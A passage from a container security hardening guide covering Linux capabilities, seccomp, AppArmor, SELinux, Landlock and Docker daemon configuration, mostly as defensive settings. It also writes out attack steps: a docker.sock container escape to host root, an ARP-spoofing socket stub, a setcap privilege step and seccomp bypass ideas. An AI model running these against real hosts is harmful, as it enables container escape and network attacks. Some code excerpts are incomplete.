#define CAP_SYS_PTRACE   19  /* ptrace any process, including outside NS */
#define CAP_SYS_MODULE   16  /* Load/unload kernel modules */
#define CAP_SYS_RAWIO    17  /* ioperm/iopl, /dev/mem, /dev/kmem access */
#define CAP_DAC_READ_SEARCH 2 /* Bypass DAC read/search for files/dirs */

/* Network-related */
#define CAP_NET_ADMIN    12  /* Network interface config, firewall, routing */
#define CAP_NET_RAW      13  /* Raw sockets, packet sockets */
#define CAP_NET_BIND_SERVICE 10 /* Bind to ports < 1024 */

/* Filesystem */
#define CAP_DAC_OVERRIDE  1  /* Bypass file DAC permissions */
#define CAP_CHOWN         0  /* Change file ownership */
#define CAP_FOWNER        3  /* Bypass permission checks when UID matches */
#define CAP_SETUID       7   /* Manipulate UIDs */
#define CAP_SETGID       6   /* Manipulate GIDs */

/* Process management */
#define CAP_KILL          5  /* Send signals to any process */
#define CAP_SYS_CHROOT   18  /* Use chroot() */

/* Security */
#define CAP_MAC_ADMIN    33  /* Override MAC (SELinux, AppArmor) */
#define CAP_MAC_OVERRIDE 32  /* Override MAC */
#define CAP_AUDIT_WRITE  29  /* Write to audit log */
#define CAP_AUDIT_CONTROL 30 /* Enable/disable auditing */

/* Capability Bounding Set: maximum capabilities ANY exec can have */
/* Effective set: currently active capabilities */
/* Permitted set: capabilities process may use */
/* Inheritable set: capabilities inherited across exec */
/* Ambient set: automatically inherited across exec (kernel 4.3+) */
```

### 5.2 Docker Default Capability Set

Docker grants a reduced but still substantial set by default:

```bash
# Docker's DEFAULT capabilities (from docker/daemon/oci_linux.go):
# capAdd (added back from none):
AUDIT_WRITE      # Write to audit log
CHOWN            # Change file ownership
DAC_OVERRIDE     # Bypass file permissions
FOWNER           # Bypass permission checks
FSETID           # Set SUID/SGID bits
KILL             # Send signals
MKNOD            # Create device files
NET_BIND_SERVICE # Bind to privileged ports
NET_RAW          # Raw sockets (DANGEROUS - ARP spoofing possible!)
SETFCAP          # Set file capabilities
SETGID           # Set GID
SETPCAP          # Modify capability sets
SETUID           # Set UID
SYS_CHROOT       # Call chroot()

# NOT granted by default (but you need explicit --cap-add):
SYS_ADMIN
SYS_PTRACE
SYS_MODULE
NET_ADMIN
DAC_READ_SEARCH
SYS_RAWIO
... and many more
```

**Security analysis of NET_RAW (granted by default):**

```c
/*
 * NET_RAW is granted by Docker default and is a significant risk.
 * With NET_RAW, a container can:
 * 1. Create raw sockets (ARP spoofing, ICMP flooding)
 * 2. Send arbitrary Ethernet frames (if on same L2 network)
 * 3. Spoof source IP addresses for DoS attacks
 * 4. Perform man-in-the-middle attacks within bridge network
 *
 * CVE-2020-14386: NET_RAW capability combined with kernel bug in
 * packet socket (AF_PACKET) allowed privilege escalation.
 * A container with NET_RAW could escalate to root on host!
 */

/* VULNERABLE: Default Docker container with NET_RAW can ARP spoof */
/* C code for ARP spoofing inside container (for education): */
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>

/* This code would work inside a default Docker container! */
int arp_spoof_example(void) {
    /* CAP_NET_RAW allows creating this socket */
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("socket"); /* Would fail without CAP_NET_RAW */
        return -1;
    }
    /* From here, can send spoofed ARP replies */
    /* ... spoof code ... */
    return 0;
}

/* MITIGATION: Drop NET_RAW */
/* In docker run: */
/*   docker run --cap-drop=NET_RAW my-image */
/* In Kubernetes: */
/*   securityContext:
       capabilities:
         drop: ["NET_RAW", "ALL"]
         add: ["only_what_you_need"] */
```

### 5.3 Secure Capability Configuration

**Principle of Least Privilege for capabilities:**

```bash
# MOST SECURE: Drop ALL capabilities, add only what's needed
docker run \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \  # Only if binding to port < 1024
  --no-new-privileges \         # Prevent privilege escalation via setuid
  my-webserver

# --no-new-privileges is critical:
# It sets the NO_NEW_PRIVS bit via prctl(PR_SET_NO_NEW_PRIVS, 1)
# This prevents:
# - execve() from gaining capabilities via setuid bits
# - execve() from gaining capabilities via file capabilities
# - seccomp filter bypass via execve of a more privileged binary

# Verify capability set of running container:
docker inspect  | jq '.[0].HostConfig.CapAdd'
docker inspect  | jq '.[0].HostConfig.CapDrop'

# Inside container - check effective caps:
cat /proc/self/status | grep -i cap
# CapInh, CapPrm, CapEff, CapBnd, CapAmb - all should be minimal
# Decode: printf '%08x\n' 0x00000000000004e0 | xargs capsh --decode=
capsh --print  # If capsh available
```

**File capabilities: a subtle attack vector:**

```c
/*
 * File capabilities (fscaps) allow executables to have capabilities
 * without being SUID root. They're stored in xattrs:
 * security.capability = 
 *
 * VULNERABILITY: An attacker who can write files in container might
 * set file capabilities on executables to gain capabilities after exec.
 * This is why --no-new-privileges is critical!
 *
 * Example: attacker sets CAP_NET_RAW on /usr/bin/python3
 * setcap cap_net_raw+ep /usr/bin/python3
 * Then executes it to get NET_RAW capability!
 *
 * With NO_NEW_PRIVS=1: kernel ignores file capabilities
 * Without it: file capabilities apply on execve
 */

/* Kernel path: execve -> security_bprm_creds_from_file -> cap_bprm_creds_from_file */
/* In kernel/capability.c: */
int cap_bprm_creds_from_file(struct linux_binprm *bprm, struct file *file) {
    /* If NO_NEW_PRIVS is set, skip file capability elevation */
    if (bprm->unsafe & LSM_UNSAFE_NO_NEW_PRIVS)
        return 0;  /* No new privs - ignore file caps */

    /* Otherwise, read security.capability xattr and apply */
    /* ... */
}

/* SECURE: Always set NO_NEW_PRIVS in container runtime init code */
if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
    perror("prctl PR_SET_NO_NEW_PRIVS");
    exit(1);
}
```

### 5.4 CAP_SYS_ADMIN: "The New Root"

`CAP_SYS_ADMIN` is required for ~170+ different kernel operations and is effectively equivalent to root for most purposes:

```bash
# Operations enabled by CAP_SYS_ADMIN (partial list):
# mount/umount any filesystem (including /proc, /sys on host!)
# Override disk quota limits
# Set process groups (setpgid beyond normal rules)
# Perform various filesystem ioctl operations
# Create named pipes with mkfifo
# Write to /proc/PID/* files
# Override cgroup migration restrictions
# Set hostname (also in UTS namespace)
# Load eBPF programs (with kernel version caveats)
# Clone with CLONE_NEWUSER without privilege
# Access /proc/kmsg
# Configure network namespaces
# Mount tmpfs with specific options
# Override namespace restrictions

# Real-world escape with CAP_SYS_ADMIN + no user NS:
# Container can:
# 1. Mount /proc on host (if not in separate NS):
mount -t proc proc /host_proc  # Needs CAP_SYS_ADMIN
# 2. Access host processes via /host_proc/1/...
# 3. Inject code via /proc/PID/mem manipulation

# DETECTION: Look for containers with SYS_ADMIN
docker ps -q | xargs docker inspect | \
  jq '.[] | select(.HostConfig.CapAdd[]? == "SYS_ADMIN") | .Name'
```

---

## 6. Seccomp: Syscall Filtering

### 6.1 Seccomp BPF Architecture

Seccomp (Secure Computing Mode) uses the Berkeley Packet Filter (BPF) virtual machine to filter system calls:

```
Architecture:

Process makes syscall
    │
    ▼
Linux Kernel syscall entry point (arch/x86/entry/syscalls/syscall_64.tbl)
    │
    ▼
Seccomp filter execution (kernel/seccomp.c)
    │
    ├── Filter returns SECCOMP_RET_ALLOW  → syscall executes normally
    ├── Filter returns SECCOMP_RET_ERRNO  → syscall returns -errno
    ├── Filter returns SECCOMP_RET_KILL_THREAD → thread killed (SIGSYS)
    ├── Filter returns SECCOMP_RET_KILL_PROCESS → entire process group killed
    ├── Filter returns SECCOMP_RET_TRAP  → sends SIGSYS with siginfo
    ├── Filter returns SECCOMP_RET_TRACE → notify tracer (ptrace)
    └── Filter returns SECCOMP_RET_LOG  → allow but log
```

**BPF filter structure:**

```c
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include 
#include 

/*
 * Seccomp BPF filter: Classic BPF (cBPF) not eBPF!
 * Operates on struct seccomp_data:
 *
 * struct seccomp_data {
 *     int   nr;                   // syscall number
 *     __u32 arch;                 // architecture (AUDIT_ARCH_X86_64)
 *     __u64 instruction_pointer;  // instruction pointer at syscall
 *     __u64 args[6];              // syscall arguments
 * };
 *
 * BPF programs work on 32-bit words.
 * For 64-bit args, must load high and low 32-bit words separately.
 */

/* Example: strict allowlist filter */
static struct sock_filter strict_filter[] = {
    /* Load architecture */
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
             offsetof(struct seccomp_data, arch)),
    /* Ensure we're on x86_64 - TOCTOU protection */
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
    /* Wrong arch: kill */
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),

    /* Load syscall number */
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
             offsetof(struct seccomp_data, nr)),

    /* Allow specific syscalls */
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_read,   5, 0),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_write,  4, 0),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_exit,   3, 0),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_exit_group, 2, 0),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_brk,    1, 0),

    /* Default: kill process */
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
    /* Allowed: return ALLOW */
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
};

int apply_seccomp_filter(void) {
    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(strict_filter) / sizeof(strict_filter[0])),
        .filter = strict_filter,
    };

    /* PR_SET_NO_NEW_PRIVS required before seccomp if not root */
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
        perror("prctl(PR_SET_NO_NEW_PRIVS)");
        return -1;
    }

    /* Apply filter via seccomp(2) syscall (preferred) or prctl */
    if (syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER, 0, &prog) != 0) {
        /* Fallback to prctl */
        if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog) != 0) {
            perror("seccomp filter");
            return -1;
        }
    }

    return 0;
}
```

### 6.2 Docker's Default Seccomp Profile

Docker ships a default seccomp profile that blocks ~44 syscalls:

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_X86", "SCMP_ARCH_X32"],
  "syscalls": [
    {
      "names": ["accept", "accept4", "access", "adjtimex", "alarm",
                "bind", "brk", "capget", "capset", "chdir",
                "chmod", "chown", "chown32", "clock_getres",
                "clock_gettime", "clock_nanosleep", "close",
                "connect", "copy_file_range", "creat", "dup", "dup2", "dup3"
                ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "names": ["clone"],
      "action": "SCMP_ACT_ALLOW",
      "args": [
        {
          "index": 0,
          "value": 2114060288,
          "op": "SCMP_CMP_MASKED_EQ",
          "valueTwo": 0
        }
      ],
      "comment": "Allow clone only without CLONE_NEWUSER flag"
    }
  ]
}

/* Notable BLOCKED syscalls in Docker's default profile: */
/*
  - kexec_load          : Load new kernel
  - create_module       : Load kernel module (pre-3.x)
  - init_module         : Load kernel module
  - finit_module        : Load kernel module from fd
  - delete_module       : Unload kernel module
  - iopl                : Change I/O privilege level
  - ioperm              : Set port I/O permissions
  - mount               : Mount filesystem
  - umount / umount2    : Unmount filesystem
  - pivot_root          : Change root filesystem
  - swapon / swapoff    : Enable/disable swap
  - sysfs               : Get kernel filesystem info
  - _sysctl             : Read/write system parameters (deprecated)
  - afs_syscall         : AFS filesystem syscall
  - add_key             : Add key to kernel keyring
  - request_key         : Request key from keyring
  - keyctl              : Keyring operations
  - perf_event_open     : Performance monitoring (can leak info)
  - ptrace              : Process tracing
  - process_vm_readv    : Read from another process's memory
  - process_vm_writev   : Write to another process's memory
  - bpf                 : BPF operations (blocked unless needed)
  - userfaultfd         : User-space page fault handling
  - setns               : Join namespace
  - unshare             : Disassociate namespaces
  - lookup_dcookie      : Directory cookie lookup
  - mbind               : Set NUMA memory policy
  - migrate_pages       : Move pages between NUMA nodes
  - move_pages          : Move process pages
*/
```

### 6.3 Seccomp Profile for Production Workloads

Writing a production seccomp profile requires profiling your application:

```bash
# Method 1: Use strace to collect syscalls during testing
strace -f -e trace=all -o /tmp/strace.out ./myapp
awk -F'(' '{print $1}' /tmp/strace.out | sort -u > /tmp/syscalls.txt

# Method 2: Use eBPF/seccomp-bpf to audit-log syscalls first
# Deploy with SECCOMP_RET_LOG instead of KILL, then analyze logs

# Method 3: Use OCI hook or Falco to collect syscall profiles

# Example: Minimal profile for a Go HTTP server
# Go's runtime uses: futex, epoll_*, read, write, close,
#                    mmap, munmap, mprotect, sigaltstack,
#                    getsockname, getpeername, socket, bind,
#                    listen, accept4, connect, setsockopt,
#                    gettid, clone, nanosleep, sched_yield,
#                    rt_sigaction, rt_sigprocmask, rt_sigreturn,
#                    getrlimit, setrlimit, openat, fstat, ...

# seccomp-profile-tool by Containers org:
# https://github.com/containers/oci-seccomp-bpf-hook

# Build profile from trace:
docker run --security-opt seccomp=unconfined \
  --annotation io.containers.trace-syscall=of:/tmp/my-profile.json \
  my-image

# Then use the generated profile:
docker run --security-opt seccomp=/tmp/my-profile.json my-image
```

### 6.4 Seccomp Escape Techniques and Mitigations

```c
/*
 * ATTACK 1: x32 ABI confusion
 * On x86_64, syscall numbers for x32 ABI are offset by 0x40000000
 * If seccomp filter checks arch but allows x32, attacker can call
 * syscalls via x32 ABI that are "blocked" in x86_64 numbering.
 *
 * MITIGATION: Explicitly deny x32 ABI in seccomp filter:
 */
BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
/* Check for x32 ABI bit */
BPF_JUMP(BPF_JMP | BPF_JGE | BPF_K, 0x40000000, 0, 1),
BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),

/*
 * ATTACK 2: Time-of-check/time-of-use (TOCTOU) in seccomp
 * seccomp_data.args[] contains syscall arguments AT TIME OF SYSCALL
 * But argument values can be in userspace memory that changes after
 * seccomp reads them (in theory - mitigated by kernel reading args once)
 *
 * Real TOCTOU: seccomp can't check the CONTENT of pointer arguments
 * (e.g., filename in open(), flags in mmap())
 * Only argument values (integers) can be reliably checked.
 *
 * EXAMPLE: Filtering openat() but not checking path:
 * Seccomp: allow openat with O_RDONLY
 * Attack: open /proc/self/mem for writing (O_RDWR) - seccomp sees flags,
 *         can check O_RDWR, but CANNOT check the path.
 *
 * This means seccomp argument filtering for pointer args is unreliable.
 * Use LSM (AppArmor/SELinux) for path-based filtering.
 */

/*
 * ATTACK 3: Speculative execution bypass (Spectre v1 in BPF)
 * Spectre-class attacks can potentially leak seccomp filter decisions
 * via CPU speculation.
 * Mitigation: use SECCOMP_RET_KILL_PROCESS (kills entire process group)
 * rather than SECCOMP_RET_ERRNO which allows continued execution.
 */

/*
 * ATTACK 4: seccomp filter bypass via SIGKILL mitigation
 * SECCOMP_RET_KILL only kills the THREAD, not the process
 * If the attacker controls multiple threads, one can catch SIGSYS
 * from another thread's seccomp violation to infer filter behavior
 * and extract information about the filter policy.
 * MITIGATION: Use SECCOMP_RET_KILL_PROCESS to kill entire process.
 */
```

---

## 7. Linux Security Modules: AppArmor & SELinux

### 7.1 LSM Architecture

Linux Security Modules (LSM) provides hooks throughout the kernel for mandatory access control:

```c
/*
 * LSM hooks are called at critical kernel decision points.
 * Each LSM can deny operations that kernel DAC (discretionary access control)
 * would otherwise allow.
 *
 * Key LSM hooks relevant to containers:
 */

/* File access hooks */
security_inode_permission(inode, mask)      /* Before file open/access */
security_file_open(file)                     /* After file open */
security_inode_create(dir, dentry, mode)     /* Before file creation */
security_inode_unlink(dir, dentry)           /* Before file deletion */
security_inode_rename(old_dir, old_dentry, new_dir, new_dentry, flags)

/* Process/capability hooks */
security_capable(cred, ns, cap, opts)        /* Capability check */
security_task_kill(p, info, sig, cred)       /* Before sending signal */
security_ptrace_access_check(child, mode)    /* Before ptrace */
security_bprm_creds_from_file(bprm, file)    /* During execve */

/* Network hooks */
security_socket_create(family, type, protocol, kern)
security_socket_bind(sock, address, addrlen)
security_socket_connect(sock, address, addrlen)
security_socket_sendmsg(sock, msg, size)

/* IPC hooks */
security_msg_queue_msgrcv(msq, msg, target, type, mode)
security_shm_shmat(shp, shmaddr, shmflg)
security_sem_semop(sma, sops, nsops, alter)
```

### 7.2 AppArmor for Containers

AppArmor uses path-based mandatory access control:

```bash
# Docker's default AppArmor profile (docker-default):
# Location: /etc/apparmor.d/docker-default
# Applied to ALL containers unless --security-opt apparmor=unconfined

# Key restrictions in docker-default profile:
profile docker-default flags=(attach_disconnected,mediate_deleted) {
  # Allow most filesystem reads
  file,

  # Network access
  network,

  # Capabilities (in addition to kernel caps, AppArmor further restricts)
  capability,

  # DENY: writing to /proc/sysrq-trigger
  deny /proc/sysrq-trigger rwklx,

  # DENY: accessing /sys/kernel/security (bypass security subsystems)
  deny /sys/kernel/security/** rwklx,

  # DENY: kcore (direct kernel memory)
  deny /proc/kcore rwklx,

  # DENY: Changing MAC policy
  deny @{PROC}/sys/kernel/** wklx,
}

# Custom AppArmor profile for a web server:
cat > /etc/apparmor.d/my-webserver << 'EOF'
#include <tunables/global>

profile my-webserver flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>
  #include <abstractions/nameservice>

  # Allow network
  network tcp,
  network udp,

  # Application binary (read + execute)
  /usr/local/bin/webserver rix,

  # Read config
  /etc/webserver/** r,

  # Write logs
  /var/log/webserver/** w,

  # Read static content
  /var/www/** r,

  # /proc for self-inspection only
  /proc/@{pid}/** r,
  /proc/sys/net/core/somaxconn r,

  # No /proc/{other-pid}/ access
  deny /proc/{[0-9]*,sys}/** rwklx,

  # No capability escalation
  deny capability sys_admin,
  deny capability sys_ptrace,
  deny capability net_admin,
  deny capability sys_module,

  # No raw sockets
  deny network raw,
  deny network packet,
}
EOF

# Load the profile
apparmor_parser -r /etc/apparmor.d/my-webserver

# Apply to container
docker run --security-opt apparmor=my-webserver my-webserver-image
```

**AppArmor complain mode for development (building profiles):**

```bash
# Complain mode: logs violations but doesn't deny
# Useful for building profiles without breaking applications

aa-genprof /usr/local/bin/myapp  # Interactive profile generator

# Or manually:
echo "profile myapp /usr/local/bin/myapp flags=(complain) {}" | \
  apparmor_parser -a

# Run application in complain mode, check logs:
journalctl -k | grep apparmor | grep myapp

# Check AppArmor status:
aa-status
apparmor_status

# Verify container's AppArmor profile:
docker inspect  | jq '.[0].AppArmorProfile'
cat /proc/$(docker inspect --format '{{.State.Pid}}' CONTAINER)/attr/current
```

### 7.3 SELinux for Containers

SELinux uses label-based mandatory access control (much stronger than AppArmor):

```bash
# SELinux concepts:
# - Subject: process with a label (context)
# - Object: file/socket/process with a label
# - Policy: rules defining allowed interactions
# - Context: user:role:type:level (e.g., system_u:system_r:container_t:s0:c1,c2)

# Container process label in SELinux:
# system_u:system_r:container_t:s0:c123,c456
# - container_t: the type (defines what this process can do)
# - s0: MLS sensitivity level
# - c123,c456: MCS category pair (unique per container!)

# MCS (Multi-Category Security): each container gets a unique pair (c0-c1023)
# This prevents containers from accessing each other's files even with same type

# Verify container SELinux context:
ps -Z -C containerd
ps -eZ | grep 

# File labels for container volumes:
ls -Z /var/lib/docker/
# system_u:object_r:container_var_lib_t:s0

# When mounting volumes, SELinux labels must allow access:
docker run -v /mydata:/data:z my-image   # z = shared between containers
docker run -v /mydata:/data:Z my-image   # Z = exclusive to this container

# :z relabels to container_file_t (shared, multiple containers can access)
# :Z relabels with unique MCS pair (only this container can access)

# Custom SELinux policy for container:
# 1. Run in permissive mode with audit logging
setenforce 0
docker run my-image
audit2allow -i /var/log/audit/audit.log -M mycontainer

# 2. Compile and install module
semodule -i mycontainer.pp

# 3. Run with enforcing
setenforce 1
docker run --security-opt label=type:mycontainer_t my-image
```

**SELinux policy module for container (Type Enforcement):**

```
# my_container.te - SELinux type enforcement file
policy_module(my_container, 1.0)

# Define our container process type
type my_container_t;
type my_container_exec_t;
init_daemon_domain(my_container_t, my_container_exec_t)

# Allow container to:
# - Read its config files
type my_container_conf_t;
files_type(my_container_conf_t)
allow my_container_t my_container_conf_t:file { read getattr open };

# - Write to its log directory
type my_container_log_t;
logging_log_file(my_container_log_t)
allow my_container_t my_container_log_t:dir { write add_name };
allow my_container_t my_container_log_t:file { create write };

# - Use network TCP
corenet_tcp_sendrecv_generic_port(my_container_t)
corenet_tcp_bind_all_ports(my_container_t)

# - Use basic process operations
kernel_read_system_state(my_container_t)
auth_use_nsswitch(my_container_t)

# DENY (implicitly - anything not allowed):
# - Cannot access /etc/shadow
# - Cannot access other containers' files (different MCS pair)
# - Cannot load kernel modules
# - Cannot ptrace other processes
# - Cannot mount filesystems
```

### 7.4 Landlock: The New LSM (Kernel 5.13+)

Landlock is a new LSM that allows unprivileged processes to restrict their own access:

```c
/*
 * Landlock: userspace-defined file access control
 * No root required! Processes can self-restrict.
 * Perfect for container runtimes and sandbox escape mitigation.
 *
 * Key feature: layered sandboxing - each exec can ADD restrictions
 * (cannot be removed, only made more restrictive)
 */

#include <linux/landlock.h>
#include <sys/syscall.h>
#include 
#include 
#include 
#include 
#include 
#include 

/* Syscall wrappers (Landlock is new, no libc wrappers yet) */
static int landlock_create_ruleset(
    const struct landlock_ruleset_attr *const attr,
    const size_t size, const __u32 flags) {
    return syscall(__NR_landlock_create_ruleset, attr, size, flags);
}

static int landlock_add_rule(const int ruleset_fd,
    const enum landlock_rule_type rule_type,
    const void *const rule_attr, const __u32 flags) {
    return syscall(__NR_landlock_add_rule, ruleset_fd, rule_type, rule_attr, flags);
}

static int landlock_restrict_self(const int ruleset_fd, const __u32 flags) {
    return syscall(__NR_landlock_restrict_self, ruleset_fd, flags);
}

/*
 * SECURE: Use Landlock to restrict container process filesystem access
 * This provides defense-in-depth even if other security controls fail
 */
int apply_landlock_sandbox(const char *allowed_read_dir,
                           const char *allowed_write_dir) {
    struct landlock_ruleset_attr ruleset_attr = {
        .handled_access_fs =
            LANDLOCK_ACCESS_FS_EXECUTE |
            LANDLOCK_ACCESS_FS_WRITE_FILE |
            LANDLOCK_ACCESS_FS_READ_FILE |
            LANDLOCK_ACCESS_FS_READ_DIR |
            LANDLOCK_ACCESS_FS_REMOVE_DIR |
            LANDLOCK_ACCESS_FS_REMOVE_FILE |
            LANDLOCK_ACCESS_FS_MAKE_CHAR |
            LANDLOCK_ACCESS_FS_MAKE_DIR |
            LANDLOCK_ACCESS_FS_MAKE_REG |
            LANDLOCK_ACCESS_FS_MAKE_SOCK |
            LANDLOCK_ACCESS_FS_MAKE_FIFO |
            LANDLOCK_ACCESS_FS_MAKE_BLOCK |
            LANDLOCK_ACCESS_FS_MAKE_SYM |
            LANDLOCK_ACCESS_FS_REFER |    /* kernel 5.19+ */
            LANDLOCK_ACCESS_FS_TRUNCATE,  /* kernel 6.2+ */
    };

    int ruleset_fd = landlock_create_ruleset(&ruleset_attr,
                                              sizeof(ruleset_attr), 0);
    if (ruleset_fd < 0) {
        if (errno == ENOSYS || errno == EOPNOTSUPP) {
            fprintf(stderr, "Landlock not supported, skipping\n");
            return 0;  /* Graceful degradation */
        }
        perror("landlock_create_ruleset");
        return -1;
    }

    /* Add rule: allow reading from allowed_read_dir */
    struct landlock_path_beneath_attr path_attr = {
        .allowed_access =
            LANDLOCK_ACCESS_FS_READ_FILE |
            LANDLOCK_ACCESS_FS_READ_DIR |
            LANDLOCK_ACCESS_FS_EXECUTE,
    };

    path_attr.parent_fd = open(allowed_read_dir, O_PATH | O_CLOEXEC);
    if (path_attr.parent_fd < 0) {
        perror("open allowed_read_dir");
        close(ruleset_fd);
        return -1;
    }

    if (landlock_add_rule(ruleset_fd, LANDLOCK_RULE_PATH_BENEATH,
                          &path_attr, 0) < 0) {
        perror("landlock_add_rule read");
        close(path_attr.parent_fd);
        close(ruleset_fd);
        return -1;
    }
    close(path_attr.parent_fd);

    /* Add rule: allow writing to allowed_write_dir */
    path_attr.allowed_access =
        LANDLOCK_ACCESS_FS_WRITE_FILE |
        LANDLOCK_ACCESS_FS_MAKE_REG |
        LANDLOCK_ACCESS_FS_MAKE_DIR |
        LANDLOCK_ACCESS_FS_REMOVE_FILE |
        LANDLOCK_ACCESS_FS_REMOVE_DIR;

    path_attr.parent_fd = open(allowed_write_dir, O_PATH | O_CLOEXEC);
    if (path_attr.parent_fd < 0) {
        perror("open allowed_write_dir");
        close(ruleset_fd);
        return -1;
    }

    if (landlock_add_rule(ruleset_fd, LANDLOCK_RULE_PATH_BENEATH,
                          &path_attr, 0) < 0) {
        perror("landlock_add_rule write");
        close(path_attr.parent_fd);
        close(ruleset_fd);
        return -1;
    }
    close(path_attr.parent_fd);

    /* NO_NEW_PRIVS required before restricting self */
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0) {
        perror("prctl NO_NEW_PRIVS");
        close(ruleset_fd);
        return -1;
    }

    /* Apply the ruleset - now process cannot access other paths */
    if (landlock_restrict_self(ruleset_fd, 0) < 0) {
        perror("landlock_restrict_self");
        close(ruleset_fd);
        return -1;
    }

    close(ruleset_fd);
    return 0;
}
```

---

## 8. Docker Architecture & Security Model

### 8.1 Docker Component Architecture

```
Docker Architecture (security-relevant components):

User ──── docker CLI ────────────────────────────────────────────────────────┐
                │ HTTPS/Unix socket (/var/run/docker.sock)                   │
                ▼                                                             │
         dockerd (Docker Daemon)                                              │
                │                                                             │
                ├── REST API server (/var/run/docker.sock)                   │
                │     [CRITICAL ATTACK SURFACE]                              │
                │                                                             │
                ├── Image management (layers, registry, signatures)          │
                │     └── content-addressable storage                        │
                │                                                             │
                ├── Network management (libnetwork, CNM)                     │
                │     └── iptables rules, veth pairs, bridges                │
                │                                                             │
                ├── Volume management (bind mounts, named volumes)           │
                │                                                             │
                └── containerd client (gRPC to containerd socket)           │
                          │ /run/containerd/containerd.sock                  │
                          ▼                                                   │
                    containerd                                                │
                          │                                                   │
                          ├── Snapshot management (overlay2, etc.)           │
                          ├── Image store                                     │
                          ├── Container lifecycle management                  │
                          └── shim management                                │
                                    │                                         │
                                    ▼                                         │
                          containerd-shim-runc-v2                            │
                                    │                                         │
                                    └── runc (OCI runtime)                  │
                                              │                               │
                                              └── Container Process          │
└───────────────────────────────────────────────────────────────────────────┘
```

### 8.2 The Docker Socket: Primary Attack Vector

The Docker daemon socket (`/var/run/docker.sock`) is the most critical attack surface:

```bash
# The Docker socket gives root access to the host.
# ANY process with access to docker.sock can:
# 1. Create containers with --privileged
# 2. Mount host filesystem
# 3. Escape to host root

# ATTACK: Container with docker.sock mounted can escape to host
docker run -v /var/run/docker.sock:/var/run/docker.sock ubuntu \
  docker run --rm -it -v /:/host ubuntu chroot /host

# REAL WORLD: CI/CD systems that mount docker.sock for DinD (Docker in Docker)
# are completely compromised if a container escapes.

# Better alternatives to mounting docker.sock:
# 1. Use rootless Docker (docker.sock owned by user, not root)
# 2. Use BuildKit with remote builders (no socket mount needed)
# 3. Use Kaniko, ko, buildah for image building (no daemon needed)
# 4. Use sysbox runtime for true Docker-in-Docker isolation

# Secure Docker daemon TLS configuration:
# /etc/docker/daemon.json
{
  "hosts": ["unix:///var/run/docker.sock", "tcp://0.0.0.0:2376"],
  "tls": true,
  "tlscacert": "/etc/docker/certs/ca.pem",
  "tlscert": "/etc/docker/certs/server-cert.pem",
  "tlskey": "/etc/docker/certs/server-key.pem",
  "tlsverify": true
}

# Generate certs:
# CA key
openssl genrsa -aes256 -out ca-key.pem 4096
openssl req -new -x509 -days 365 -key ca-key.pem -sha256 -out ca.pem

# Server key + cert
openssl genrsa -out server-key.pem 4096
openssl req -subj "/CN=docker-host" -sha256 -new -key server-key.pem -out server.csr
echo subjectAltName = DNS:docker-host,IP:10.0.0.1,IP:127.0.0.1 >> extfile.cnf
echo extendedKeyUsage = serverAuth >> extfile.cnf
openssl x509 -req -days 365 -sha256 -in server.csr -CA ca.pem \
  -CAkey ca-key.pem -CAcreateserial -out server-cert.pem -extfile extfile.cnf

# Client key + cert
openssl genrsa -out key.pem 4096
openssl req -subj '/CN=client' -new -key key.pem -out client.csr
echo extendedKeyUsage = clientAuth > extfile-client.cnf
openssl x509 -req -days 365 -sha256 -in client.csr -CA ca.pem \
  -CAkey ca-key.pem -CAcreateserial -out cert.pem -extfile extfile-client.cnf
```

### 8.3 Docker daemon.json Hardening

Complete production-hardened daemon configuration:

```json
{
  "icc": false,
  "ip-forward": false,
  "live-restore": true,
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
  },
  "default-ulimits": {
    "nofile": {
      "Name": "nofile",
      "Hard": 64000,
      "Soft": 64000
    },
    "nproc": {
      "Name": "nproc",
      "Hard": 512,
      "Soft": 512
    }
  },
  "seccomp-profile": "/etc/docker/seccomp/custom-profile.json",
  "no-new-privileges": true,
  "userns-remap": "default",
  "storage-driver": "overlay2",
  "storage-opts": ["overlay2.override_kernel_check=true"],
  "experimental": false,
  "iptables": true,
  "ip-masq": true,
  "userland-proxy": false,
  "selinux-enabled": true,
  "tls": true,
  "tlscacert": "/etc/docker/certs/ca.pem",
  "tlscert": "/etc/docker/certs/server-cert.pem",
  "tlskey": "/etc/docker/certs/server-key.pem",
  "tlsverify": true,
  "registry-mirrors": [],
  "insecure-registries": [],
  "max-concurrent-downloads": 3,
  "max-concurrent-uploads": 5
}
```

**Configuration option explanations:**

```
"icc": false
  → Inter-container communication disabled on default bridge
  → Containers can only communicate via explicitly published ports
  → Prevents lateral movement between containers

"no-new-privileges": true
